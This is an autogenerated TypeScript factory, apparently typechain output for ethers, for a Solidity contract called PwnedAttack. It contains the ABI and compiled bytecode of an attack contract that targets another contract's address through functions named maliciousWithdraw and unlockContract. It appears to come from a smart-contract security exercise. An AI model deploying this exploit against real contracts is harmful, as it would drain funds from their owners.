/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import { Signer, utils, Contract, ContractFactory, Overrides } from "ethers";
import type { Provider, TransactionRequest } from "@ethersproject/providers";
import type {
  PwnedAttack,
  PwnedAttackInterface,
} from "../../AttackPwned.sol/PwnedAttack";

const _abi = [
  {
    inputs: [
      {
        internalType: "address payable",
        name: "_pwnedAddress",
        type: "address",
      },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "depositInto",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [],
    name: "getBalance",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "maliciousWithdraw",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "password",
    outputs: [
      {
        internalType: "bytes32",
        name: "",
        type: "bytes32",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "unlockContract",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "withdraw",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    stateMutability: "payable",
    type: "receive",
  },
];

const _bytecode =
  "0x6080604052646d6168616d60001b60025534801561001c57600080fd5b50604051610dc5380380610dc5833981810160405281019061003e9190610128565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610155565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100f5826100ca565b9050919050565b610105816100ea565b811461011057600080fd5b50565b600081519050610122816100fc565b92915050565b60006020828403121561013e5761013d6100c5565b5b600061014c84828501610113565b91505092915050565b610c61806101646000396000f3fe6080604052600436106100745760003560e01c806322f0f2f91161004e57806322f0f2f9146101895780633ccfd60b146101a05780638da5cb5b146101b75780639a0a51ee146101e257610117565b806312065fe01461011c5780631ea3949e14610147578063224b610b1461015e57610117565b366101175760008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163190506100f46040518060400160405280600f81526020017f7468652062616c616e63652069732000000000000000000000000000000000008152506101ec565b6100fd81610285565b670de0b6b3a764000081106101155761011461031e565b5b005b600080fd5b34801561012857600080fd5b50610131610445565b60405161013e9190610863565b60405180910390f35b34801561015357600080fd5b5061015c61031e565b005b34801561016a57600080fd5b5061017361044d565b6040516101809190610897565b60405180910390f35b34801561019557600080fd5b5061019e610453565b005b3480156101ac57600080fd5b506101b5610574565b005b3480156101c357600080fd5b506101cc61064d565b6040516101d991906108f3565b60405180910390f35b6101ea610673565b005b6102828160405160240161020091906109a7565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050610821565b50565b61031b816040516024016102999190610863565b6040516020818303038152906040527ff5b1bba9000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050610821565b50565b6000670de0b6b3a76400006040516024016103399190610a22565b6040516020818303038152906040527f2e1a7d4d000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16816040516103fd9190610a84565b6000604051808303816000865af19150503d806000811461043a576040519150601f19603f3d011682016040523d82523d6000602084013e61043f565b606091505b50505050565b600047905090565b60025481565b60006002546040516024016104689190610897565b6040516020818303038152906040527fec9b5b3a000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168160405161052c9190610a84565b6000604051808303816000865af19150503d8060008114610569576040519150601f19603f3d011682016040523d82523d6000602084013e61056e565b606091505b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610604576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105fb90610ae7565b60405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561064a573d6000803e3d6000fd5b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b662386f26fc1000034116106bc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106b390610b79565b60405180910390fd5b6000306040516024016106cf91906108f3565b6040516020818303038152906040527ff340fa01000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050905060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1634836040516107979190610a84565b60006040518083038185875af1925050503d80600081146107d4576040519150601f19603f3d011682016040523d82523d6000602084013e6107d9565b606091505b505090508061081d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161081490610c0b565b60405180910390fd5b5050565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b6000819050919050565b61085d8161084a565b82525050565b60006020820190506108786000830184610854565b92915050565b6000819050919050565b6108918161087e565b82525050565b60006020820190506108ac6000830184610888565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006108dd826108b2565b9050919050565b6108ed816108d2565b82525050565b600060208201905061090860008301846108e4565b92915050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561094857808201518184015260208101905061092d565b83811115610957576000848401525b50505050565b6000601f19601f8301169050919050565b60006109798261090e565b6109838185610919565b935061099381856020860161092a565b61099c8161095d565b840191505092915050565b600060208201905081810360008301526109c1818461096e565b905092915050565b6000819050919050565b600067ffffffffffffffff82169050919050565b6000819050919050565b6000610a0c610a07610a02846109c9565b6109e7565b6109d3565b9050919050565b610a1c816109f1565b82525050565b6000602082019050610a376000830184610a13565b92915050565b600081519050919050565b600081905092915050565b6000610a5e82610a3d565b610a688185610a48565b9350610a7881856020860161092a565b80840191505092915050565b6000610a908284610a53565b915081905092915050565b7f6f6e6c79206f776e65722063616e2063616c6c2074686973206d6574686f6400600082015250565b6000610ad1601f83610919565b9150610adc82610a9b565b602082019050919050565b60006020820190508181036000830152610b0081610ac4565b9050919050565b7f506c656173652063616c6c20646f6e617465207769746820302e30303120455460008201527f482e000000000000000000000000000000000000000000000000000000000000602082015250565b6000610b63602283610919565b9150610b6e82610b07565b604082019050919050565b60006020820190508181036000830152610b9281610b56565b9050919050565b7f5472616e73616374696f6e2063616c6c207573696e6720656e636f646557697460008201527f685369676e6174757265206973207375636365737366756c0000000000000000602082015250565b6000610bf5603883610919565b9150610c0082610b99565b604082019050919050565b60006020820190508181036000830152610c2481610be8565b905091905056fea2646970667358221220c8a6c0f5d2178d95a9ca832b0672385226c9a3eaeda40fa4cbe9da34a974ffaa64736f6c634300080d0033";

type PwnedAttackConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: PwnedAttackConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class PwnedAttack__factory extends ContractFactory {
  constructor(...args: PwnedAttackConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
  }

  override deploy(
    _pwnedAddress: string,
    overrides?: Overrides & { from?: string | Promise<string> }
  ): Promise<PwnedAttack> {
    return super.deploy(_pwnedAddress, overrides || {}) as Promise<PwnedAttack>;
  }
  override getDeployTransaction(
    _pwnedAddress: string,
    overrides?: Overrides & { from?: string | Promise<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(_pwnedAddress, overrides || {});
  }
  override attach(address: string): PwnedAttack {
    return super.attach(address) as PwnedAttack;
  }
  override connect(signer: Signer): PwnedAttack__factory {
    return super.connect(signer) as PwnedAttack__factory;
  }

  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): PwnedAttackInterface {
    return new utils.Interface(_abi) as PwnedAttackInterface;
  }
  static connect(
    address: string,
    signerOrProvider: Signer | Provider
  ): PwnedAttack {
    return new Contract(address, _abi, signerOrProvider) as PwnedAttack;
  }
}
